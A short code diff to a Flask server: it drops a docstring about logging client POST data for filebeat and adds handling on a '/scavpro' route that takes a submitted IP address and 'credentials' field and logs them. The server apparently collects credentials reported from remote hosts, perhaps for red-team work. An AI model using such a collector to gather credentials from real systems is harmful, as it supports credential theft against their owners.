@@ -1,8 +1,3 @@
-"""
-Process POST requests from clients, log data to files so it can be sent with filebeat
-@author: degenerat3
-"""
-
 import datetime
 import os
 from flask import Flask, request
@@ -28,4 +23,7 @@ def process_campfire():
 @app.route('/scavpro', methods=['POST'])
 def process_scavpro():
     content = request.json
+    ip = content['IP']
+    creds = content['credentials']
+    log_creds(ip, creds)
     return "Success"
